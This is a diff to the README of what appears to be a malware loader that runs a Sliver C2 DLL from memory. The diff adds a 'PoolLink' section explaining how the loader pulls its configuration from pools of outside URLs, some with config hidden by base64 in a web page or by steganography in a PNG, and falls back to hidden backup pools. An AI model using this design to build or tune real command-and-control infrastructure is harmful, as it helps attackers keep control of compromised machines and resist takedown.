@@ -32,6 +32,7 @@ malléable : adjectif
     - [3.1 Banner config](#31-Banner-config)
     - [3.2 Encrypted dll config](#32-Encrypted-dll-config)
     - [3.3 Stegano to hide config](#33-Stegano-to-hide-config)
+    - [3.4 PoolLink explanation](#34-PoolLink-explanation)
   - [4. Compile loader](#4-Compile-loader)
     - [4.1 linux compilation](#41-linux-compilation)
     - [4.2 windows debug compilation with logs](#42-windows-debug-compilation-with-logs)
@@ -135,29 +136,46 @@ Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, th
 
 ```
 {
-  "loaderconf_update_links": [
-    {
-      "HTTP": {
-        "url": "https://kaboum.xyz/artdonjon/gobelin.html",
-        "dataoperation": [
-          "WEBPAGE",
-          "BASE64"
-        ],
-        "sleep": 0,
-        "jitt": 0
-      }
-    },
-    {
-      "HTTP": {
-        "url": "https://kaboum.xyz/artdonjon/troll.png",
-        "dataoperation": [
-          "STEGANO"
-        ],
-        "sleep": 0,
-        "jitt": 0
-      }
-    }
-  ],
+  "update_links": {
+    "1": [
+      "kaboum.xyz first links",
+      {
+        "pool_mode": {
+          "ADVANCED": {
+            "random": 0,
+            "max_link_broken": 0,
+            "parallel": true,
+            "linear": true,
+            "stop_same": false,
+            "stop_new": false,
+            "accept_old": false
+          }
+        },
+        "pool_links": [
+          {
+            "HTTP": {
+              "url": "https://kaboum.xyz/artdonjon/gobelin.html",
+              "dataoperation": [
+                "WEBPAGE",
+                "BASE64"
+              ],
+              "sleep": 0,
+              "jitt": 0
+            }
+          },
+          {
+            "HTTP": {
+              "url": "https://kaboum.xyz/artdonjon/troll.png",
+              "dataoperation": [
+                "STEGANO"
+              ],
+              "sleep": 0,
+              "jitt": 0
+            }
+          },
+
+  [..]
+
   "payloads": [
     {
       "DllFromMemory": {
@@ -335,6 +353,31 @@ export STEGANO_INPUT_IMAGE=/path/to/your/image.png
 ```
 
 !WARNING! jpg should be supported too but, but during my last tests it wasnt working, so prefer to export the image into a png format instead of jpg.
+
+### 3.4 PoolLink explanation
+
+To deal with multiple update config link, you can regroup them into pool.
+This is configure to have first Pool of config and to hide the next backup config pool.
+
+You can define quick SIMPLE PoolLink config or Advanced.
+Basically, if you choose the SIMPLE one, it's like if you have define an Adavanced PoolLInk like that :
+```
+        let advanced = Advanced {
+            random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
+            max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
+            parallel: false,    // try to fetch every link in the same time, if not its one by one
+            linear: true,       // fetch link in the order or randomized
+            stop_same: false,   // stop if found the same conf -> not for parallel
+            stop_new: false,    // stop if found a new conf -> not for parallel
+            accept_old: false,  // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
+        };
+```
+Here, all config link of the pool will be fetch one by one in the same order and only the newest one will be choose to replace the actual config.
+If not VALID config are found and at least one config identical to the actual config are found, the actual config is conserved and the payload are rune.
+if NO valid config are found in a Pool, the loader go to check the next Pool and so on.
+
+All output example are not in this format, 
+
 
 ## 4. Compile loader
 
